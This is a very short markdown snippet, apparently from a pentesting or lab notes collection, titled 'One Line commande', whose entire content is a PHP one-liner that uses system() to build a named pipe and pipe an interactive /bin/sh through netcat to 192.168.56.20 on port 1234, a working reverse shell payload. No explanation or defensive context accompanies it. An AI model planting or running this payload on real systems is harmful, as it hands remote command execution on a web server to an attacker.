
### One Line commande 

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.20 1234 >/tmp/f"); ?>
```